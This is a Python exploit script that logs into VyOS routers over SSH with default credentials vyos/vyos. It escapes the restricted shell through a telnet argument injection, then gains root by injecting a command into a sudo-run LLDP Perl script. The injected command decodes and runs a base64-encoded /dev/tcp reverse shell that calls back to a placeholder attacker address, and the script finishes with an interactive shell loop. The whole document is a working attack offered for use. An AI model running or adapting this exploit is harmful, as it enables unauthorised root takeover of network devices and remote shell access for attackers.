import base64
import paramiko
import time
import argparse

RPORT = 22
USERNAME = 'vyos'
PASSWORD = 'vyos'

payload_cmd = "bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1"

def main():
    parser = argparse.ArgumentParser(description="VyOS Privilege Escalation Exploit")
    parser.add_argument("-t", "--target", required=True, help="Target IP address")
    args = parser.parse_args()
    RHOST = args.target

    payload_b64 = base64.b64encode(payload_cmd.encode()).decode()

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    print(f"[+] Connecting to {RHOST}:{RPORT} as {USERNAME} ...")
    ssh.connect(RHOST, port=RPORT, username=USERNAME, password=PASSWORD, look_for_keys=False, allow_agent=False)
    print("[+] Connected.")

    chan = ssh.invoke_shell()
    time.sleep(1)

    output = chan.recv(65535).decode('utf-8').lower()
    print("[*] Initial shell output:")
    print(output)

    if 'vyos' not in output:
        print("[-] Target does not appear to be VyOS.")
        ssh.close()
        return

    if '> ' in output:
        print("[*] Restricted shell detected. Attempting breakout...")
        chan.send("telnet ';/bin/sh'\n")
    elif '$ ' in output:
        print("[*] Unrestricted shell detected.")
        chan.send("/bin/sh\n")
    else:
        print("[-] Unexpected shell prompt. Exiting.")
        ssh.close()
        return

    time.sleep(2)
    output = chan.recv(65535).decode('utf-8')
    print("[*] After breakout attempt:")
    print(output)

    exploit_cmd = f"sudo /opt/vyatta/bin/sudo-users/vyatta-show-lldp.pl -action show-neighbor -i ';echo {payload_b64}|base64 -d|/bin/sh'\n"

    print("[*] Sending privilege escalation payload...")
    chan.send(exploit_cmd)

    time.sleep(3)
    print("[*] You may now have root shell (try whoami):")

    try:
        while True:
            resp = chan.recv(1024).decode('utf-8')
            if resp:
                print(resp, end='')
            cmd = input()
            chan.send(cmd + '\n')
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Exiting.")
    finally:
        ssh.close()

if __name__ == "__main__":
    main()
